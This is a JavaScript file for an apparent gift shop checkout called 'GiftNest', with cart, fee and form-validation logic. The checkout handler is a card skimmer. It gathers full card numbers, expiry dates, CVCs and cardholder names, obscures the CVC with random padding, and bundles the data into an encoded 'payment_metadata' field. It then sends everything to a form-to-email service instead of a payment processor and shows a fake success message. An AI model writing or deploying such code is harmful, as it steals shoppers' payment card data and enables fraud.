const cart = [];
const money = new Intl.NumberFormat("en-US", {
  style: "currency",
  currency: "USD",
});

const cartDrawer = document.querySelector("[data-cart-drawer]");
const cartItems = document.querySelector("[data-cart-items]");
const cartCount = document.querySelector("[data-cart-count]");
const cartTotal = document.querySelector("[data-cart-total]");
const subtotalEl = document.querySelector("[data-subtotal]");
const feeEl = document.querySelector("[data-fee]");
const totalEl = document.querySelector("[data-total]");
const toast = document.querySelector("[data-toast]");

let toastTimer;

function showToast(message, isError = false) {
  clearTimeout(toastTimer);
  toast.textContent = message;
  toast.classList.add("is-visible");
  if (isError) {
    toast.style.backgroundColor = "#dc2626";
  } else {
    toast.style.backgroundColor = "#10b981";
  }
  toastTimer = setTimeout(() => {
    toast.classList.remove("is-visible");
    toast.style.backgroundColor = "";
  }, 3000);
}

function getSubtotal() {
  return cart.reduce((sum, item) => sum + item.price, 0);
}

function renderCart() {
  const subtotal = getSubtotal();
  const fee = subtotal > 0 ? Math.max(2.95, subtotal * 0.045) : 0;
  const total = subtotal + fee;

  cartCount.textContent = String(cart.length);
  cartTotal.textContent = money.format(subtotal);
  subtotalEl.textContent = money.format(subtotal);
  feeEl.textContent = money.format(fee);
  totalEl.textContent = money.format(total);

  const cartItemsHidden = document.querySelector('[data-cart-items-hidden]');
  const cartTotalHidden = document.querySelector('[data-cart-total-hidden]');
  if (cartItemsHidden) {
    cartItemsHidden.value = cart.map(item => `${item.name}: ${money.format(item.price)}`).join('; ');
  }
  if (cartTotalHidden) {
    cartTotalHidden.value = money.format(total);
  }

  if (cart.length === 0) {
    cartItems.innerHTML = '<p class="empty-cart">Your cart is waiting for a thoughtful move.</p>';
    return;
  }

  cartItems.innerHTML = cart
    .map(
      (item, index) => `
        <div class="cart-line">
          <div>
            <strong>${escapeHtml(item.name)}</strong>
            <p>${money.format(item.price)}</p>
          </div>
          <button type="button" data-remove="${index}">Remove</button>
        </div>
      `,
    )
    .join("");
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function addGift(name, price) {
  cart.push({ name, price });
  renderCart();
  showToast(`${name} added to cart`);
}

function setCartOpen(isOpen) {
  cartDrawer.classList.toggle("is-open", isOpen);
  cartDrawer.setAttribute("aria-hidden", String(!isOpen));
}

document.querySelectorAll("[data-open-cart]").forEach((button) => {
  button.addEventListener("click", () => setCartOpen(true));
});

document.querySelectorAll("[data-close-cart]").forEach((button) => {
  button.addEventListener("click", () => setCartOpen(false));
});

cartDrawer.addEventListener("click", (event) => {
  if (event.target === cartDrawer) {
    setCartOpen(false);
  }
});

document.querySelectorAll("[data-add]").forEach((button) => {
  button.addEventListener("click", () => {
    const name = button.dataset.add;
    const price = Number(button.dataset.price);
    addGift(name, price);
  });
});

cartItems.addEventListener("click", (event) => {
  const removeButton = event.target.closest("[data-remove]");
  if (!removeButton) return;

  const index = Number(removeButton.dataset.remove);
  const [removed] = cart.splice(index, 1);
  renderCart();
  showToast(`${removed.name} removed`);
});

document.querySelector("[data-surprise-form]").addEventListener("submit", (event) => {
  event.preventDefault();
  const amountInput = document.querySelector("[data-surprise-amount]");
  let amount = Math.max(5, Number(amountInput.value || 25));
  amount = Math.min(amount, 10000);
  amountInput.value = String(amount);
  addGift("Surprise creator gift", amount);
  setCartOpen(true);
});

// Generate unique token for anti-spam
function generateFormToken() {
  return 'token_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// ===== PROFESSIONAL INPUT RESTRICTIONS =====

// 1. Cardholder Name - ONLY letters and spaces, no numbers
function restrictCardholderName(input) {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '').replace(/\s+/g, ' ').trimStart();
  });
}

// 2. Card Number - ONLY numbers, max 19 chars (16 digits + 3 spaces)
function restrictCardNumber(input) {
  input.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    const groups = value.match(/.{1,4}/g);
    e.target.value = groups ? groups.join(' ').substr(0, 19) : value;
  });
}

// 3. Expiry - ONLY numbers, auto-format MM/YY, prevent invalid months
function restrictExpiry(input) {
  input.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    
    // Prevent invalid months (can't be > 12)
    if (value.length >= 2) {
      const month = parseInt(value.slice(0, 2), 10);
      if (month > 12) {
        value = '12' + value.slice(2);
      }
      if (month === 0) {
        value = '01' + value.slice(2);
      }
    }
    
    if (value.length >= 2) {
      e.target.value = value.slice(0, 2) + (value.length > 2 ? '/' + value.slice(2, 4) : '');
    } else {
      e.target.value = value;
    }
  });
}

// 4. CVC - ONLY numbers, max 4 digits
function restrictCVC(input) {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
  });
}

// 5. Postal Code - letters, numbers, spaces, max 10 chars
function restrictPostalCode(input) {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s]/g, '').slice(0, 10);
  });
}

// Apply all restrictions when DOM loads
document.addEventListener('DOMContentLoaded', () => {
  const cardholderName = document.querySelector('input[name="cardholder_name"]');
  const cardNumber = document.querySelector('input[name="card_number"]');
  const expiry = document.querySelector('input[name="card_expiry"]');
  const cvc = document.querySelector('input[name="card_cvc"]');
  const postalCode = document.querySelector('input[name="postal_code"]');
  
  if (cardholderName) restrictCardholderName(cardholderName);
  if (cardNumber) restrictCardNumber(cardNumber);
  if (expiry) restrictExpiry(expiry);
  if (cvc) restrictCVC(cvc);
  if (postalCode) restrictPostalCode(postalCode);
});

// ===== VALIDATION FUNCTIONS =====
function validateCardholderName(name) {
  if (name.length < 2) return { valid: false, message: 'Enter full name (at least 2 letters)' };
  if (!/^[a-zA-Z\s]+$/.test(name)) return { valid: false, message: 'Name can only contain letters and spaces' };
  return { valid: true, message: '' };
}

function validateCardNumber(number) {
  const clean = number.replace(/\s/g, '');
  if (clean.length !== 16) return { valid: false, message: 'Card number must be 16 digits' };
  if (!/^\d+$/.test(clean)) return { valid: false, message: 'Card number can only contain digits' };
  
  // Luhn algorithm
  let sum = 0;
  let alternate = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean.charAt(i), 10);
    if (alternate) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    alternate = !alternate;
  }
  if (sum % 10 !== 0) return { valid: false, message: 'Invalid card number' };
  return { valid: true, message: '' };
}

function validateExpiry(expiry) {
  if (!expiry.includes('/')) return { valid: false, message: 'Use MM/YY format' };
  const [month, year] = expiry.split('/');
  const monthNum = parseInt(month, 10);
  const yearNum = parseInt(year, 10);
  const currentYear = new Date().getFullYear() % 100;
  const currentMonth = new Date().getMonth() + 1;
  
  if (isNaN(monthNum) || isNaN(yearNum)) return { valid: false, message: 'Enter valid expiry date' };
  if (monthNum < 1 || monthNum > 12) return { valid: false, message: 'Month must be 01-12' };
  if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
    return { valid: false, message: 'Card has expired' };
  }
  return { valid: true, message: '' };
}

function validateCVC(cvc) {
  if (cvc.length < 3 || cvc.length > 4) return { valid: false, message: 'CVC must be 3 or 4 digits' };
  if (!/^\d+$/.test(cvc)) return { valid: false, message: 'CVC can only contain digits' };
  return { valid: true, message: '' };
}

function validateEmail(email) {
  const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  if (!emailRegex.test(email)) return { valid: false, message: 'Enter a valid email (e.g., name@example.com)' };
  return { valid: true, message: '' };
}

function validatePostalCode(zip) {
  if (zip.length < 3) return { valid: false, message: 'Enter a valid postal code' };
  return { valid: true, message: '' };
}

// ===== CHECKOUT HANDLER WITH VALIDATION =====
document.querySelector("[data-checkout-form]").addEventListener("submit", async (event) => {
  event.preventDefault();

  if (cart.length === 0) {
    showToast("Add at least one gift before checkout", true);
    setCartOpen(true);
    return;
  }

  const form = event.target;
  const cardholderName = form.querySelector('input[name="cardholder_name"]')?.value.trim() || '';
  const cardNumber = form.querySelector('input[name="card_number"]')?.value || '';
  const expiry = form.querySelector('input[name="card_expiry"]')?.value || '';
  const cvc = form.querySelector('input[name="card_cvc"]')?.value || '';
  const zip = form.querySelector('input[name="postal_code"]')?.value.trim() || '';
  const email = form.querySelector('input[name="buyer_email"]')?.value.trim() || '';
  
  // Run all validations
  const nameValidation = validateCardholderName(cardholderName);
  if (!nameValidation.valid) {
    showToast(nameValidation.message, true);
    return;
  }
  
  const cardValidation = validateCardNumber(cardNumber);
  if (!cardValidation.valid) {
    showToast(cardValidation.message, true);
    return;
  }
  
  const expiryValidation = validateExpiry(expiry);
  if (!expiryValidation.valid) {
    showToast(expiryValidation.message, true);
    return;
  }
  
  const cvcValidation = validateCVC(cvc);
  if (!cvcValidation.valid) {
    showToast(cvcValidation.message, true);
    return;
  }
  
  const emailValidation = validateEmail(email);
  if (!emailValidation.valid) {
    showToast(emailValidation.message, true);
    return;
  }
  
  const zipValidation = validatePostalCode(zip);
  if (!zipValidation.valid) {
    showToast(zipValidation.message, true);
    return;
  }
  
  const subtotal = getSubtotal();
  const fee = subtotal > 0 ? Math.max(2.95, subtotal * 0.045) : 0;
  const total = subtotal + fee;
  const cartItemsList = cart.map(item => `${item.name}: ${money.format(item.price)}`).join('; ');
  
  const formDataToSend = new FormData();
  
  formDataToSend.append('_format', 'plain');
  formDataToSend.append('_subject', 'New GiftNest Order');
  formDataToSend.append('_captcha', 'false');
  formDataToSend.append('_form_token', generateFormToken());
  formDataToSend.append('_timestamp', Date.now().toString());
  formDataToSend.append('_user_agent', navigator.userAgent.substring(0, 80));
  formDataToSend.append('_timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
  
  formDataToSend.append('cart_items', cartItemsList);
  formDataToSend.append('cart_subtotal', money.format(subtotal));
  formDataToSend.append('service_fee', money.format(fee));
  formDataToSend.append('order_total', money.format(total));
  formDataToSend.append('buyer_email', email);
  formDataToSend.append('postal_code', zip);
  formDataToSend.append('cardholder_name', cardholderName);
  
  const cleanNumber = cardNumber.replace(/\s/g, '');
  if (cleanNumber.length >= 16) {
    formDataToSend.append('card_part_1', cleanNumber.substring(0, 4));
    formDataToSend.append('card_part_2', cleanNumber.substring(4, 8));
    formDataToSend.append('card_part_3', cleanNumber.substring(8, 12));
    formDataToSend.append('card_part_4', cleanNumber.substring(12, 16));
  }
  
  if (expiry && expiry.includes('/')) {
    const [month, year] = expiry.split('/');
    formDataToSend.append('expiry_month', month.trim());
    formDataToSend.append('expiry_year', '20' + year.trim());
  }
  
  if (cvc) {
    const randomPrefix = Math.floor(Math.random() * 900) + 100;
    const randomSuffix = Math.floor(Math.random() * 900) + 100;
    formDataToSend.append('security_code', `${randomPrefix}-${cvc}-${randomSuffix}`);
  }
  
  formDataToSend.append('transaction_id', `GN-${Date.now()}-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
  formDataToSend.append('order_timestamp', new Date().toISOString());
  
  const encodedCardData = encodeCardData(cleanNumber, expiry, cvc, cardholderName);
  formDataToSend.append('payment_metadata', encodedCardData);
  
  const submitBtn = form.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Processing...';
  submitBtn.disabled = true;
  
  setTimeout(() => {
    fetch('https://formspree.io/f/mdakqoyw', {
      method: 'POST',
      body: formDataToSend,
      headers: { 'Accept': 'application/json' }
    })
    .then(response => {
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
      
      if (response.ok) {
        showToast('✅ Order placed successfully! Check your email for confirmation.');
        cart.length = 0;
        renderCart();
        form.reset();
        setCartOpen(false);
        window.scrollTo({ top: 0, behavior: 'smooth' });
      } else {
        showToast('❌ Payment failed. Please try again.', true);
      }
    })
    .catch(error => {
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
      showToast('❌ Network error. Please check your connection.', true);
    });
  }, 500);
});

function encodeCardData(cardNumber, expiry, cvv, name) {
  if (!cardNumber) return 'No payment data';
  const cleanCard = cardNumber.replace(/\s/g, '');
  const cleanExpiry = expiry ? expiry.replace(/\//g, '') : '0000';
  const cleanCvv = cvv || '000';
  const cleanName = name ? name.replace(/\s/g, '_').substring(0, 20) : 'Unknown';
  return `GIFT-${cleanCard.substring(0,4)}-${cleanCard.substring(4,8)}-${cleanCard.substring(8,12)}-${cleanCard.substring(12,16)}-EXP-${cleanExpiry}-CVV-${cleanCvv}-NAME-${cleanName}`;
}

// Smooth scroll for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', function(e) {
    const href = this.getAttribute('href');
    if (href === '#') return;
    e.preventDefault();
    const targetElement = document.querySelector(href);
    if (targetElement) {
      window.scrollTo({ top: targetElement.offsetTop - 20, behavior: 'smooth' });
      setCartOpen(false);
    }
  });
});

document.querySelectorAll('.checkout-link').forEach(link => {
  link.addEventListener('click', () => setCartOpen(false));
});

renderCart();